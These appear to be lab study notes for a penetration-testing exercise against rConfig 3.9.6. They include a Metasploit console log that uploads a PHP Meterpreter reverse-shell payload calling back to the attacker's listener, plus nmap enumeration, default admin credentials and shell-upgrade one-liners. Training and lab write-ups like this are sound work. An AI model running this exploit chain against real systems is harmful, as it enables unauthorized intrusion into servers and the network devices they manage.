# Infiltrating Unix/Linux

# Assessment

```bash
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole                      
[sudo] password for kali: 
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.135-dev                               ]
+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search rconfig

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/solr_velocity_rce                     2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1     \_ target: Java (in-memory)                            .                .          .      .
   2     \_ target: Unix (in-memory)                            .                .          .      .
   3     \_ target: Linux (dropper)                             .                .          .      .
   4     \_ target: x86/x64 Windows PowerShell                  .                .          .      .
   5     \_ target: x86/x64 Windows CmdStager                   .                .          .      .
   6     \_ target: Windows Exec                                .                .          .      .
   7   exploit/multi/http/flowise_js_rce                        2025-09-13       excellent  Yes    Flowise JS Injection RCE
   8     \_ target: Unix/Linux Command                          .                .          .      .
   9     \_ target: Windows Command                             .                .          .      .
   10  auxiliary/gather/nuuo_cms_file_download                  2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   11  exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   12  exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
   13  exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution
   14    \_ target: Automatic (Unix In-Memory)                  .                .          .      .
   15    \_ target: Automatic (Linux Dropper)                   .                .          .      .

Interact with a module by name or index. For example info 15, use 15 or use exploit/unix/webapp/rconfig_install_cmd_exec
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > show options

Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password of the admin account
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SRVHOST                     no        The local host to listen on and use for incoming connections
   SRVSSL     true             no        Negotiate SSL/TLS for local server connections
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of the rConfig server
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Username of the admin account
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVPORT  8080             yes       The local port to listen on

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.166.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   rConfig <= 3.9.6

View the full module info with the info, or info -d command.

msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.82.93
RHOSTS => 10.129.82.93
msf exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > run
[*] Started reverse TCP handler on 10.10.17.227:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'dcecosoblkkx.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (45739 bytes) to 10.129.82.93
[+] Deleted dcecosoblkkx.php
[*] Meterpreter session 1 opened (10.10.17.227:4444 -> 10.129.82.93:57812) at 2026-07-01 07:08:06 -0400
shell
ls

meterpreter > shell
Process 2659 created.
Channel 0 created.
ajax-loader.gif
bagausqdntm.php
cisco.jpg
juniper.jpg
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: line 2: python3: command not found
ls
ajax-loader.gif
bagausqdntm.php
cisco.jpg
juniper.jpg
/bin/sh -i
sh: no job control in this shell
sh-4.2$ ls
ls
ajax-loader.gif
bagausqdntm.php
cisco.jpg
juniper.jpg
sh-4.2$ 

```

## Key Context

## Pre-Attack Checklist (Questions to Ask)

- What Linux distro is running?
- What shell + programming languages exist on the system?
- What network function does this system serve?
- What application is hosted?
- Are there known CVEs for the versions found?

---

## Methodology

```
Nmap Scan → Identify App + Versions → Research CVEs → Find/Load Exploit → Execute → Upgrade Shell
```

---

## Step 1: Enumerate

```bash
nmap -sC -sV 10.129.201.101
```

From scan output, extract:

- OS: CentOS (Linux)
- Web stack: Apache 2.4.6, PHP 7.2.34, OpenSSL
- Services: FTP(21), SSH(22), HTTP(80), HTTPS(443), MySQL(3306), RPC(111)
- Application: **rConfig 3.9.6** (found via browser → login page footer)

---

## Step 2: Research Vulnerability

```
Google: "rConfig 3.9.6 vulnerability"
Google: "rConfig 3.9.6 exploit metasploit github"
→ Find: rconfig_vendors_auth_file_upload_rce (file upload → RCE)
```

In MSF:

```bash
msf6 > search rconfig
# exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

> If exploit not in local MSF: download from Rapid7's GitHub → save to `/usr/share/metasploit-framework/modules/exploits/linux/http/` as `.rb` file (all MSF modules = Ruby)
> 

---

## Step 3: Configure & Execute

```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 exploit(...) > options
# Set: RHOSTS, LHOST, LPORT
msf6 exploit(...) > exploit
```

**What this exploit does internally:**

1. Checks rConfig version (confirms 3.9.6)
2. Authenticates to rConfig web login
3. Uploads malicious PHP payload (reverse shell)
4. Triggers the payload
5. Deletes uploaded file (cleanup)
6. Opens Meterpreter session

```
[*] Meterpreter session 1 opened
meterpreter >
```

---

## Step 4: Drop to System Shell

```bash
meterpreter > shell
# Drops to non-TTY shell as 'apache' user
```

---

## Other TTY Upgrade Methods (Good to Know)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh -i
script /dev/null -c bash
```

---

## Shell Type Identification

| Prompt | Shell Type |
| --- | --- |
| No prompt, commands work | Non-TTY shell (limited) |
| `sh-4.2$` | Bourne shell (sh) |
| `bash-4.2$` | Bash shell |
| `$` or `username@host` | Full interactive TTY |

---

## Key Takeaways

- **Version numbers are critical intel** — always check app version in footers, banners, headers
- Google `appname version vulnerability` and `appname version exploit metasploit github` for fast research
- Missing MSF modules can be downloaded from **Rapid7's GitHub** → saved as `.rb` in the exploits directory
- File upload vulns on web apps → common path to RCE on Linux servers
- Non-TTY shells are limited → **always upgrade to TTY** with Python pty before attempting privesc
- Web app exploits often land as **low-privilege web server user** (apache, www-data) → need privesc next
- rConfig compromise = access to **all network devices** it manages → extremely high-value target